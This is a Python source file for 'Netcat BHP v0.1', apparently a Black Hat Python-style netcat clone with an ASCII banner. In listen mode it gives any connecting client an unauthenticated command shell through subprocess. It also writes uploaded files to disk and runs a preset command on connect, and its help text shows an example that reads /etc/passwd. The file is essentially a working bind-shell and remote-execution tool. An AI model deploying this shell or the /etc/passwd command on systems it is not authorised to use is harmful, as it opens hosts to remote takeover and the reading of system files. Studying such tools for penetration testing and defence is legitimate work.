import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()
    
    def send(self):
        try:
            self.socket.connect((self.args.target, self.args.port))
            if self.buffer:
                self.socket.send(self.buffer)
            
            while True:
                response = self.receive_data()
                if response:
                    print(response, end='')  # Ensure proper formatting without extra new lines
                user_input = input('> ')
                if user_input.strip().lower() == 'exit':
                    break
                user_input += '\n'
                self.socket.send(user_input.encode())
        except KeyboardInterrupt:
            print('Interrupted by user')
        except Exception as e:
            print(f'Error: {e}')
        finally:
            self.socket.close()
            sys.exit()

    def receive_data(self):
        response = ''
        while True:
            data = self.socket.recv(4096)
            if not data:
                break
            response += data.decode()
            if len(data) < 4096:
                break
        return response
    
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        print(f'Listening on {self.args.target}:{self.args.port}')
        while True:
            client_socket, addr = self.socket.accept()
            print(f'Connection from {addr}')
            client_thread = threading.Thread(
                target=self.handle_client, args=(client_socket,)
            )
            client_thread.start()

    def handle_client(self, client_socket):
        try:
            if self.args.execute:
                output = self.execute_command(self.args.execute)
                client_socket.send(output.encode())
            elif self.args.upload:
                self.handle_file_upload(client_socket)
            elif self.args.command:
                self.handle_shell_command(client_socket)
        except Exception as e:
            print(f'Error handling client: {e}')
        finally:
            client_socket.close()
    
    def handle_file_upload(self, client_socket):
        file_buffer = b''
        while True:
            data = client_socket.recv(4096)
            if not data:
                break
            file_buffer += data
        
        with open(self.args.upload, 'wb') as f:
            f.write(file_buffer)
        message = f'File saved as {self.args.upload}'
        client_socket.send(message.encode())

    def handle_shell_command(self, client_socket):
        while True:
            client_socket.send(b'BHP: #> ')
            cmd_buffer = b''
            while b'\n' not in cmd_buffer:
                cmd_buffer += client_socket.recv(64)
            cmd = cmd_buffer.decode().strip()
            if cmd.lower() == 'exit':
                break
            response = self.execute_command(cmd)
            if response:
                client_socket.send(response.encode())

    def execute_command(self, cmd):
        try:
            cmd = cmd.strip()
            if not cmd:
                return ''
            output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
            return output.decode()
        except subprocess.CalledProcessError as e:
            return f'Command failed: {e}'

if __name__ == "__main__":
    # ANSI escape codes for colors
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    RESET = "\033[0m"

    banner = f"""
{RED}             .:::.....    .                                                          ..:::..        
               ...-#@@@#-..                                                   .:=#@@@#-.....        
                    ..%+@@@@%=.                                           .+%@@@%=%..               
                    .*-....-%@@@@*..  .                              ..#@@@@%-....==.               
                    .%.. .....+@@@@@@=.                          ..+@@@@@@-........%.               
                    .#.........@@@@=@@@@*. ..               ....#@@@@+@@@%..     .:#.               
                    .:+.........%@.....#@@@=..            ...=@@@*....:@%..      .#..               
                     .*-..................#@%...          ..@@*..    .  ...     .+=..               
                      .=#.......  ........+#@*..          .#@#=.            ....%:.                 
                       ..+#....       ..*#..*@ .          :@=..%+....      ...%=..                  
                           .+@#=:.:-#@*.. ...@:.         .-@.....:#@*-:.:=%@=...                    
                              ..  ....      .%-.         .=*.      ...... ..                        
                                            .+:.         .--..                                      
                                            .-....       .::.                                       
                                            .......   .....                                         
                                              .*@@@@@@@@@=...                                       
                                                 .@@@@@....                                         
                                                  ....                                              
                                                     ..               {RESET}
{GREEN}Netcat BHP v0.1 
by Kr4k0w{RESET}
    """

    # Print the banner with color
    print(banner)        

    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Exemplo: 
        netcat.py -t [ip] -p [port] -l -c #shell command
        netcat.py -t [ip] -p [port] -l -u=file.txt #upload file
        netcat.py -t [ip] -p [port] -l -e="cat /etc/passwd" #execute command

        echo 'ABC' | netcat.py -t [ip] -p [port] #send text to port of server

        netcat.py -t [ip] -p [port] #connect to the server
        ''')
    )
    parser.add_argument('-c', '--command', action='store_true', help='Open a shell command interface')
    parser.add_argument('-e', '--execute', help='Execute a specific command on connect')
    parser.add_argument('-l', '--listen', action='store_true', help='Listen for incoming connections')
    parser.add_argument('-p', '--port', type=int, default=5555, help='Port to bind/connect to')
    parser.add_argument('-t', '--target', default='0.0.0.0', help='Target IP to connect to')
    parser.add_argument('-u', '--upload', help='File path to upload')
    args = parser.parse_args()

    # Read buffer from stdin if not listening
    if not args.listen:
        buffer = sys.stdin.read()
    else:
        buffer = None

    nc = NetCat(args, buffer.encode() if buffer else None)
    nc.run()
